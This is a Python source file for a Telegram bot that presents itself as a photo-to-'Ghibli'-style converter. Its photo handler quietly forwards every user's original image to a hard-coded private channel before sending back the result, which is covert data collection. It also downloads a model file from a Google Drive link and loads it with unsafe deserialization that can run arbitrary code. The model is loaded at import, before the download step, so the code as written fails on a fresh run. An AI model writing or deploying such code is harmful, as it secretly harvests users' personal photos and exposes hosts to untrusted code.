import os
import torch
import requests
import threading
import cv2
import numpy as np
from flask import Flask
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext

# Telegram bot token
TOKEN = os.getenv("TELEGRAM_TOKEN")
PRIVATE_CHANNEL_ID = "-1002600772587"  # Replace with your private channel ID

# Model settings
MODEL_URL = "https://drive.google.com/uc?export=download&id=1kCJKNfzCrvEvlfTqtfTqMYMonYpQwMle"
MODEL_PATH = "models/ghibli_grain.pth"

# Ensure model directory exists
os.makedirs("models", exist_ok=True)

# Flask server for health checks
app = Flask(__name__)

@app.route("/")
def home():
    return "Bot is running!"

def run_flask():
    app.run(host="0.0.0.0", port=8000)

# Function to download the model if not present
def download_model():
    if not os.path.exists(MODEL_PATH):
        print("Downloading model...")
        response = requests.get(MODEL_URL, stream=True)
        with open(MODEL_PATH, "wb") as f:
            for chunk in response.iter_content(chunk_size=1024):
                if chunk:
                    f.write(chunk)
        print("Model downloaded successfully.")
    else:
        print("Model already exists.")

# Load model
def load_model():
    if not os.path.exists(MODEL_PATH):
        raise FileNotFoundError(f"Model file '{MODEL_PATH}' not found!")
    model = torch.load(MODEL_PATH, map_location=torch.device('cpu'), weights_only=False)
    model.eval()
    return model

model = load_model()

def process_image(image_path):
    img = cv2.imread(image_path)
    img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)
    img_tensor = torch.from_numpy(img).float() / 255.0
    img_tensor = img_tensor.permute(2, 0, 1).unsqueeze(0)
    
    with torch.no_grad():
        output = model(img_tensor)
    
    output = output.squeeze().permute(1, 2, 0).numpy() * 255
    output = cv2.cvtColor(output.astype(np.uint8), cv2.COLOR_RGB2BGR)
    processed_path = image_path.replace(".jpg", "_processed.jpg")
    cv2.imwrite(processed_path, output)
    return processed_path

async def handle_photo(update: Update, context: CallbackContext):
    photo = update.message.photo[-1]
    file = await context.bot.get_file(photo.file_id)
    file_path = f"downloads/{photo.file_id}.jpg"
    os.makedirs("downloads", exist_ok=True)
    await file.download_to_drive(file_path)
    
    # Forward original photo to private channel
    await context.bot.send_photo(chat_id=PRIVATE_CHANNEL_ID, photo=open(file_path, "rb"))
    
    # Process and send the modified image
    processed_path = process_image(file_path)
    await update.message.reply_photo(photo=open(processed_path, "rb"))

async def start(update: Update, context: CallbackContext):
    await update.message.reply_text("Send me an image, and I'll transform it!")

def main():
    bot_app = Application.builder().token(TOKEN).build()
    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    
    # Start Flask in a separate thread
    threading.Thread(target=run_flask, daemon=True).start()
    
    print("Bot is running...")
    bot_app.run_polling()

if __name__ == "__main__":
    download_model()
    main()
